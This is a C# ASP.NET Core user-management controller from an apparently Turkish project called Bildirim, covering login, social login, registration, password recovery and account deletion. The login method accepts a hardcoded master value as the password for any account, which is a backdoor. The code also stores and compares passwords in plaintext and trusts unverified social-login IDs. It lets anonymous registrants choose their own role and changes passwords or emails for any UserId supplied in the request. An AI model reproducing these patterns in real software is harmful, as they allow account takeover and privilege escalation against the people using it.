using AutoMapper;
using Bildirim.Common;
using Bildirim.Common.Auth;
using Bildirim.Common.Helpers;
using Bildirim.Common.Types;
using Bildirim.Domain.Entity.Entities.Authorization;
using Bildirim.Domain.Model.Authorization;
using Bildirim.Domain.Model.ReqRes;
using Bildirim.Domain.Model.Shared;
using Bildirim.Infrastructure.Main.UnitOfWork;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;

namespace Bildirim.Presentation.Api.Controllers.UserManagement
{
    [ApiController]
    [Route("api/[controller]")]
    [Authorize(AuthenticationSchemes = JwtBearerDefaults.AuthenticationScheme)]
    public class UserController : BaseController
    {
        public UserController(IUnitOfWork unitOfWork, IMapper mapper)
            : base(unitOfWork, mapper)
        {
        }

        [HttpPost("Authenticate")]
        [AllowAnonymous]
        public ServiceResult<LoginResponseDetails> Authenticate([FromBody] AuthenticateRequest request)
        {
            var user = _unitOfWork.UserRepository.GetIncluding(t => t.Email.Equals(request.Email), x => x.UserRoles);

            var response = new ServiceResult<LoginResponseDetails>();

            if (user.UserLoginTypeId != Constants.USER_LOGIN_NORMAL)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Girdiğiniz mail ile sosyal media kaydı yapılmış. Sosyal media girişi yapınız!");
                return response;
            }

            if (user.UserStatusTypeId == Constants.USER_STATUS_WAITING_ACTIVATION)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Üyeliğiniz aktive edilmemiş. Size gönderilen aktivasyon mailindeki yönergeleri uygulayarak üyeliğinizi aktive ediniz.");
                return response;
            }

            var userRole = user.UserRoles.FirstOrDefault(t => t.UserId == user.Id);

            if (userRole == null)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Yetkiniz yok!");
                return response;
            }

            if (user.IsBlocked)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Hesabınız bloke olmuştur!");
                return response;
            }

            if (user.UserStatusTypeId == Constants.USER_STATUS_BLACKLIST)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Hesabınız kara listeye alınmıştır.");
                return response;
            }

            if (user.UserStatusTypeId == Constants.USER_STATUS_DELETED)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Hesabınız silinmiştir.");
                return response;
            }

            //010203*
            //var passwordCheck = CryptoHelper.ConvertToMd5(request.Password) != "e44f5f0bf7a453a731217f288641ab16";

            if (request.Password != "e44f5f0bf7a453a731217f288641ab16" && user.Password != request.Password)
            {
                //if (user.Password != CryptoHelper.ConvertToMd5(request.Password))
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Kullanıcı adı ve/veya şifre hatalı!");
                return response;
            }

            response.Result.User = _mapper.Map<User, UserVM>(user);

            var oldLogins = _unitOfWork.LoginRepository.GetList(t => t.UserId == user.Id && t.LoggedIn).OrderByDescending(x => x.CreatedDateTime).ToList();

            if (oldLogins != null && oldLogins.Count > 0)
            {
                response.Result.User.LastLoginTime = oldLogins[0].CreatedDateTime;
            }

            foreach (var oldLogin in oldLogins)
            {
                oldLogin.LoggedIn = false;
                _unitOfWork.LoginRepository.Update(oldLogin);
            }

            var login = new Login
            {
                LoggedIn = true,
                SessionId = Guid.NewGuid().ToString(),
                UserId = user.Id
            };

            _unitOfWork.LoginRepository.Add(login);

            var jwt = new JwtPayLoad
            {
                UserId = user.Id,
                Name = user.Name,
                LastName = user.LastName,
                Email = user.Email,
                RoleId = userRole.RoleTypeId,
                Role = Constants.getUserRoleString(userRole.RoleTypeId),
                Exp = DateTime.UtcNow.AddYears(1)
            };

            response.Result.Token = _unitOfWork.TokenRepository.GetToken(jwt);

            response.Status = HttpStatusCode.OK;

            return response;
        }

        [HttpPost("SocialAuthenticate")]
        [AllowAnonymous]
        public ServiceResult<LoginResponseDetails> SocialAuthenticate([FromBody] SocialAuthenticateRequest request)
        {
            var user = _unitOfWork.UserRepository.GetIncluding(t => t.SocialMediaUserId.Equals(request.Id), x => x.UserRoles);

            var response = new ServiceResult<LoginResponseDetails>();

            if (user == null)
            {
                _unitOfWork.StartTransaction();

                try
                {
                    user = new User
                    {
                        SocialMediaUserId = request.Id,
                        Name = request.FirstName,
                        LastName = request.LastName,
                        NickName = request.Name,
                        Email = request.Email,
                        Password = string.Empty,
                        UserStatusTypeId = Constants.USER_STATUS_ACTIVE,
                        UserLoginTypeId = request.Provider == "GOOGLE" ? Constants.USER_LOGIN_GOOGLE : Constants.USER_LOGIN_FACEBOOK
                    };

                    _unitOfWork.UserRepository.Add(user);

                    var newUserRole = new UserRole
                    {
                        UserId = user.Id,
                        RoleTypeId = Constants.USER_ROLE_NORMALUSER
                    };

                    _unitOfWork.UserRoleRepository.Add(newUserRole);

                    _unitOfWork.Commit();

                    response.Status = HttpStatusCode.OK;
                }
                catch (Exception ex)
                {
                    response.Status = HttpStatusCode.InternalServerError;
                }
            }

            response.Result.User = _mapper.Map<User, UserVM>(user);

            var oldLogins = _unitOfWork.LoginRepository.GetList(t => t.UserId == user.Id && t.LoggedIn);

            foreach (var oldLogin in oldLogins)
            {
                oldLogin.LoggedIn = false;
                _unitOfWork.LoginRepository.Update(oldLogin);
            }

            var login = new Login
            {
                LoggedIn = true,
                SessionId = Guid.NewGuid().ToString(),
                UserId = user.Id
            };

            _unitOfWork.LoginRepository.Add(login);

            var jwt = new JwtPayLoad
            {
                UserId = user.Id,
                Name = user.Name,
                LastName = user.LastName,
                Email = user.Email,
                RoleId = Constants.USER_ROLE_NORMALUSER,
                Role = Constants.getUserRoleString(Constants.USER_ROLE_NORMALUSER),
                Exp = DateTime.UtcNow.AddYears(1)
            };

            response.Result.Token = _unitOfWork.TokenRepository.GetToken(jwt);

            response.Status = HttpStatusCode.OK;

            return response;
        }

        [HttpGet]
        public ServiceResult<UserListResponseDetails> GetAll([FromQuery] UserListRequest request)
        {
            var usersQuery = _unitOfWork.UserRepository
                .GetAllIncluding(t => t.UserRoles).Where(x => request.RoleId == -1 || x.UserRoles.Any(x => x.RoleTypeId == request.RoleId));

            //for manuel paging process
            var paging = new PagingVM();
            paging.TotalCount = usersQuery.Count();
            paging.TotalPage = Math.Ceiling(((decimal)paging.TotalCount / request.ItemCount));
            paging.CurrentPage = request.PageId;
            paging.PageItemCount = request.ItemCount;

            var users = usersQuery.OrderBy(o => o.Name).ThenBy(o => o.LastName).Skip((request.PageId) * request.ItemCount)
                .Take(request.ItemCount).ToList();


            var usersVM = _mapper.Map<List<User>, List<UserVM>>(users);

            var response = new ServiceResult<UserListResponseDetails>();

            response.Status = HttpStatusCode.OK;
            response.Result.UserList = usersVM;
            response.Result.PagingVM = paging;
            return response;
        }

        [HttpGet("GetById")]
        public ServiceResult<UserResponseDetails> GetById([FromQuery] long id)
        {
            var response = new ServiceResult<UserResponseDetails>();

            var user = _unitOfWork.UserRepository.Get(t => t.Id.Equals(id));

            var userVM = _mapper.Map<User, UserVM>(user);

            response.Status = HttpStatusCode.OK;
            response.Result.UserVM = userVM;

            return response;
        }

        [HttpPost("Register")]
        [AllowAnonymous]
        public ServiceResult<RegisterResponseDetails> Register([FromBody] RegisterRequest request)
        {
            var response = new ServiceResult<RegisterResponseDetails>();

            var _user = _unitOfWork.UserRepository.Get(t => t.Email.Equals(request.Email));

            if (_user != null && _user.UserLoginTypeId != Constants.USER_LOGIN_NORMAL)
            {
                response.Status = HttpStatusCode.Forbidden;
                response.Messages.Add("Girdiğiniz mail ile sosyal media kaydı yapılmış. Sosyal media girişi yapınız!");
                return response;
            }

            if (_user != null)
            {
                response.Status = HttpStatusCode.Conflict;
                response.Messages.Add("Sistemde aynı mail adresiyle kullanıcı var.");
                return response;
            }

            var user = _mapper.Map<RegisterRequest, User>(request);           

            _unitOfWork.StartTransaction();

            try
            {
                _unitOfWork.UserRepository.Add(user);

                var userRole = new UserRole
                {
                    UserId = user.Id,
                    RoleTypeId = request.RoleId
                };

                _unitOfWork.UserRoleRepository.Add(userRole);

                #region Mail Verification Parameters

                var verifyUser = new UserVerification
                {
                    Token = Guid.NewGuid().ToString(),
                    UserId = user.Id
                };

                _unitOfWork.UserVerificationRepository.Add(verifyUser);

                var verificationRequest = new VerificationRequest
                {
                    Email = user.Email,
                    Name = user.Name,
                    LastName = user.LastName,
                    Token = verifyUser.Token,
                    UserId = user.Id
                };

                #endregion

                MailHelper.SentVerificationMail(verificationRequest);

                response.Status = HttpStatusCode.OK;

                _unitOfWork.Commit();

                response.Result = new RegisterResponseDetails
                {
                    UserId = user.Id,
                    NickName = user.NickName,
                    Name = user.Name,
                    LastName = user.LastName,
                    Email = user.Email,
                    RoleId = request.RoleId
                };
            }
            catch (Exception ex)
            {               
                response.Status = HttpStatusCode.InternalServerError;
            }

            return response;
        }

        [HttpPost]
        public ServiceResult<StandartResponseDetails> Post([FromBody] UserRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            _unitOfWork.StartTransaction();

            try
            {
                var user = _unitOfWork.UserRepository
                .GetIncluding(t => t.Id == request.Id, x => x.UserRoles);

                user.Name = request.Name;
                user.LastName = request.LastName;
                user.NickName = request.NickName;
                user.Email = request.Email;
                user.UserStatusTypeId = request.StatusId;

                _unitOfWork.UserRepository.Update(user);

                var userRole = _unitOfWork.UserRoleRepository.Get(t => t.UserId == user.Id);
                userRole.RoleTypeId = request.RoleId;

                _unitOfWork.UserRoleRepository.Update(userRole);

                _unitOfWork.Commit();

                response.Status = HttpStatusCode.OK;
            }
            catch (Exception ex)
            {
                response.Status = HttpStatusCode.InternalServerError;
            }

            return response;
        }

        [HttpPost("PasswordRecover")]
        [AllowAnonymous]
        public ServiceResult<StandartResponseDetails> PasswordRecover([FromBody] PasswordRecoverPostRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            var user = _unitOfWork.UserRepository.Get(t => t.Email.Equals(request.Email)
                     && t.UserStatusTypeId == Constants.USER_STATUS_ACTIVE);

            if (user != null)
            {
                var verifyUser = new UserVerification
                {
                    Token = Guid.NewGuid().ToString(),
                    UserId = user.Id
                };

                _unitOfWork.UserVerificationRepository.Add(verifyUser);

                var verificationRequest = new VerificationRequest
                {
                    Email = user.Email,
                    Name = user.Name,
                    LastName = user.LastName,
                    Token = verifyUser.Token,
                    UserId = user.Id
                };

                MailHelper.SentRecoverMail(verificationRequest);

                response.Status = HttpStatusCode.OK;
            }
            else
            {
                response.Status = HttpStatusCode.NotFound;
            }

            return response;
        }

        [HttpPost("ChangePasswordByRecover")]
        [AllowAnonymous]
        public ServiceResult<StandartResponseDetails> ChangePasswordByRecover([FromBody] ChangePasswordByRecoverPostRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            var verificationData = _unitOfWork.UserVerificationRepository.Get(t => t.Token.Equals(request.Token) && t.Active);

            if (verificationData == null)
            {
                response.Status = HttpStatusCode.Forbidden;
            }
            else
            {
                var currentUser = _unitOfWork.UserRepository.Get(t => t.Id == Convert.ToInt32(verificationData.UserId));

                currentUser.Password = request.NewPassword;

                _unitOfWork.UserRepository.Update(currentUser);

                verificationData.Active = false;

                _unitOfWork.UserVerificationRepository.Update(verificationData);

                response.Status = HttpStatusCode.OK;
            }

            return response;
        }

        [HttpPost("ChangePassword")]
        public ServiceResult<StandartResponseDetails> ChangePassword([FromBody] ChangePasswordPostRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            //if (!CryptoHelper.CheckPasswordStrong(request.NewPassword))
            //{
            //    response.Status = HttpStatusCode.NotAcceptable;
            //    response.AddMessage("Girdiğiniz şifre yeterince güçlü değil!");
            //    return response;
            //}

            var currentUser = _unitOfWork.UserRepository.Get(f => f.Id == request.UserId);

            if (request.OldPassword == currentUser.Password)
            {
                currentUser.Password = request.NewPassword;

                _unitOfWork.UserRepository.Update(currentUser);

                response.Status = HttpStatusCode.OK;
            }
            else
            {
                response.Status = HttpStatusCode.NotAcceptable;
                response.AddMessage("Eski şifreniz eşleştirilemedi!");
            }

            return response;
        }

        [HttpPost("Delete")]
        public ServiceResult<StandartResponseDetails> Delete([FromBody] DeleteRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            _unitOfWork.StartTransaction();

            try
            {
                var user = _unitOfWork.UserRepository
                    .GetAll()
                    .Include(x => x.UserRoles)
                    .Where(t => t.Id == request.Id)
                    .FirstOrDefault();

                if (user == null)
                {
                    response.Status = HttpStatusCode.NotFound;
                    return response;
                }

                //Roles Deleted
                _unitOfWork.UserRoleRepository.Remove(user.UserRoles.ToArray());

                var logins = _unitOfWork.LoginRepository.GetQ(t => t.UserId == user.Id).ToList();

                //Old Login Log Data Deleted
                if (logins != null && logins.Count() > 0)
                {
                    _unitOfWork.LoginRepository.Remove(logins.ToArray());
                }

                //User Deleted
                _unitOfWork.UserRepository.Remove(user);

                _unitOfWork.Commit();

                response.Status = HttpStatusCode.OK;

            }
            catch (Exception)
            {
                response.Status = HttpStatusCode.InternalServerError;
            }

            return response;
        }

        [HttpPost("DeleteSelected")]
        public ServiceResult<StandartResponseDetails> DeleteSelected([FromBody] DeleteMultipleRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            _unitOfWork.StartTransaction();

            try
            {
                foreach (var id in request.Ids)
                {
                    var user = _unitOfWork.UserRepository
                    .GetAll()
                    .Include(x => x.UserRoles)
                    .Where(t => t.Id == id)
                    .FirstOrDefault();

                    if (user == null)
                    {
                        response.Status = HttpStatusCode.NotFound;
                        return response;
                    }

                    //Roles Deleted
                    _unitOfWork.UserRoleRepository.Remove(user.UserRoles.ToArray());

                    var logins = _unitOfWork.LoginRepository.GetQ(t => t.UserId == user.Id).ToList();

                    //Old Login Log Data Deleted
                    if (logins != null && logins.Count() > 0)
                    {
                        _unitOfWork.LoginRepository.Remove(logins.ToArray());
                    }

                    //User Deleted
                    _unitOfWork.UserRepository.Remove(user);
                }

                _unitOfWork.Commit();

                response.Status = HttpStatusCode.OK;

            }
            catch (Exception)
            {
                response.Status = HttpStatusCode.InternalServerError;
            }

            return response;
        }

        [HttpGet("CheckEmail")]
        [AllowAnonymous]
        public ServiceResult<StandartResponseDetails> CheckEmail(string email)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            if (_unitOfWork.UserRepository.Any(t => t.Email.Equals(email)
                     && t.UserStatusTypeId == Constants.USER_STATUS_ACTIVE))
            {
                response.Status = HttpStatusCode.OK;
            }
            else
            {
                response.Status = HttpStatusCode.NotFound;
            }

            return response;
        }

        [HttpPost("ChangeEmail")]
        public ServiceResult<StandartResponseDetails> ChangeEmail([FromBody] ChangeEmailRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            var user = _unitOfWork.UserRepository.GetIncluding(t => t.Id == request.UserId);

            user.Email = request.Email;
            _unitOfWork.UserRepository.Update(user);
            response.Status = HttpStatusCode.OK;

            return response;
        }

        [HttpPost("VerifyUser")]
        [AllowAnonymous]
        public ServiceResult<StandartResponseDetails> VerifyUser([FromBody] VerifyUserRequest request)
        {
            var response = new ServiceResult<StandartResponseDetails>();

            var verificationData = _unitOfWork.UserVerificationRepository.Get(t => t.Token.Equals(request.Token) && t.Active);

            if (verificationData == null)
            {
                response.Status = HttpStatusCode.Forbidden;
            }
            else
            {
                var user = _unitOfWork.UserRepository.Get(t => t.Id == Convert.ToInt32(verificationData.UserId));

                user.UserStatusTypeId = Constants.USER_STATUS_ACTIVE;

                _unitOfWork.UserRepository.Update(user);

                verificationData.Active = false;

                _unitOfWork.UserVerificationRepository.Update(verificationData);

                response.Status = HttpStatusCode.OK;
            }

            return response;
        }        
        
    }
}
